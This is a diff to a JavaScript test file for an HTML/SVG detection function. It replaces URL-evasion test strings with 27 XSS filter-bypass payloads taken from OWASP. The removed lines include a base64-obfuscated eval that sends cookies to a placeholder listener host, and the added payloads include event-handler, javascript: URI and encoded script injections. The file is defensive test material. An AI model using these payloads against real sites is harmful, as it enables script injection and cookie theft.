@@ -1064,23 +1064,37 @@ describe('Regex Matching', function() {
     })
 
     /*
-    *   Character Escape Sequences
-    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#character-escape-sequences
+    *   WAF ByPass Strings for XSS
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#waf-bypass-strings-for-xss
     */
-    it('should match URL String Evasion', function() {
-        const testString1 = `<A HREF="http://66.102.7.147/">XSS</A>`;
-        const testString2 = `<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>`;
-        const testString3 = `<A HREF="http://1113982867/">XSS</A>`;
-        const testString4 = `<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>`;
-        const testString5 = `<A HREF="http://0102.0146.0007.00000223/">XSS</A>`;
-        const testString6 = `<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">`;
-        const testString7 = `<A HREF="h
-                            tt  p://6   6.000146.0x7.147/">XSS</A>`;
-        const testString8 = `<A HREF="//www.google.com/">XSS</A>`;
-        const testString9 = `<A HREF="http://google.com/">XSS</A>`;
-        const testString10 = `<A HREF="http://www.google.com./">XSS</A>`;
-        const testString11 = `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`;
-        const testString12 = `<A HREF="http://www.google.com/ogle.com/">XSS</A>`;            
+    it('should match WAF ByPass Strings for XSS', function() {
+        const testString1 = `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`;
+        const testString2 = `<Video> <source onerror = "javascript: alert (XSS)">`;
+        const testString3 = `<Input value = "XSS" type = text>`;
+        const testString4 = `<applet code="javascript:confirm(document.cookie);">`;   
+        const testString5 = `<isindex x="javascript:" onmouseover="alert(XSS)">`;
+        const testString6 = `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`;
+        const testString7 = `"><img src="x:x" onerror="alert(XSS)">`;
+        const testString8 = `"><iframe src="javascript:alert(XSS)">`;
+        const testString9 = `<object data="javascript:alert(XSS)">`;
+        const testString10 = `<isindex type=image src=1 onerror=alert(XSS)>`;
+        const testString11 = `<img src=x:alert(alt) onerror=eval(src) alt=0>`;
+        const testString12 = `<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>`;
+        const testString13 = `<iframe/src="data:text/html,<svg onload=alert(1)>">`;
+        const testString14 = `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`;
+        const testString15 = `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`;
+        const testString16 = `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`;
+        const testString17 = `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`;
+        const testString18 = `<form><a href="javascript:\u0061lert(1)">X`;
+        const testString19 = `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`;
+        const testString20 = `<style>//*{x:expression(alert(/xss/))}//<style></style>`;
+        const testString21 = `<img src="/" =_=" title="onerror='prompt(1)'">`;
+        const testString22 = `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`;
+        const testString23 = `<script x> alert(1) </script 1=2`;
+        const testString24 = `<form><button formaction=javascript&colon;alert(1)>CLICKME`;
+        const testString25 = `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`;
+        const testString26 = `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`;
+        const testString27 = `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>`;      
 
         const result1 = findHTMLSVG(testString1);
         const result2 = findHTMLSVG(testString2);
@@ -1094,41 +1108,101 @@ describe('Regex Matching', function() {
         const result10 = findHTMLSVG(testString10);
         const result11 = findHTMLSVG(testString11);
         const result12 = findHTMLSVG(testString12);
+        const result13 = findHTMLSVG(testString13);
+        const result14 = findHTMLSVG(testString14);
+        const result15 = findHTMLSVG(testString15);
+        const result16 = findHTMLSVG(testString16);
+        const result17 = findHTMLSVG(testString17);
+        const result18 = findHTMLSVG(testString18);
+        const result19 = findHTMLSVG(testString19);
+        const result20 = findHTMLSVG(testString20);
+        const result21 = findHTMLSVG(testString21);
+        const result22 = findHTMLSVG(testString22);
+        const result23 = findHTMLSVG(testString23);
+        const result24 = findHTMLSVG(testString24);
+        const result25 = findHTMLSVG(testString25);
+        const result26 = findHTMLSVG(testString26);
+        const result27 = findHTMLSVG(testString27);
 
         assert.equal(result1[0], true);
-        assert.equal(result1[1].length, 2);
+        assert.equal(result1[1].length, 1);
 
         assert.equal(result2[0], true);
         assert.equal(result2[1].length, 2);
 
         assert.equal(result3[0], true);
-        assert.equal(result3[1].length, 2);
+        assert.equal(result3[1].length, 1);
 
         assert.equal(result4[0], true);
-        assert.equal(result4[1].length, 2);
+        assert.equal(result4[1].length, 1);
 
         assert.equal(result5[0], true);
-        assert.equal(result5[1].length, 2);
+        assert.equal(result5[1].length, 1);
 
         assert.equal(result6[0], true);
-        assert.equal(result6[1].length, 2);
+        assert.equal(result6[1].length, 3);
 
         assert.equal(result7[0], true);
-        assert.equal(result7[1].length, 2);
+        assert.equal(result7[1].length, 1);
 
         assert.equal(result8[0], true);
-        assert.equal(result8[1].length, 2);
+        assert.equal(result8[1].length, 1);
 
         assert.equal(result9[0], true);
-        assert.equal(result9[1].length, 2);
+        assert.equal(result9[1].length, 1);
 
         assert.equal(result10[0], true);
-        assert.equal(result10[1].length, 2);
+        assert.equal(result10[1].length, 1);
 
         assert.equal(result11[0], true);
-        assert.equal(result11[1].length, 2);
+        assert.equal(result11[1].length, 1);
 
         assert.equal(result12[0], true);
         assert.equal(result12[1].length, 2);
+
+        assert.equal(result13[0], true);
+        assert.equal(result13[1].length, 1);
+
+        assert.equal(result14[0], true);
+        assert.equal(result14[1].length, 1);
+
+        assert.equal(result15[0], true);
+        assert.equal(result15[1].length, 3);
+
+        assert.equal(result16[0], true);
+        assert.equal(result16[1].length, 1);
+
+        assert.equal(result17[0], true);
+        assert.equal(result17[1].length, 1);
+
+        assert.equal(result18[0], true);
+        assert.equal(result18[1].length, 2);
+
+        assert.equal(result19[0], true);
+        assert.equal(result19[1].length, 2);
+
+        assert.equal(result20[0], true);
+        assert.equal(result20[1].length, 3);
+
+        assert.equal(result21[0], true);
+        assert.equal(result21[1].length, 1);
+
+        assert.equal(result22[0], true);
+        assert.equal(result22[1].length, 1);
+
+        assert.equal(result23[0], true);
+        assert.equal(result23[1].length, 2);
+
+        assert.equal(result24[0], true);
+        assert.equal(result24[1].length, 2);
+
+        assert.equal(result25[0], true);
+        assert.equal(result25[1].length, 1);
+
+        assert.equal(result26[0], true);
+        assert.equal(result26[1].length, 2);
+
+        assert.equal(result27[0], true);
+        assert.equal(result27[1].length, 3);
     })
 });
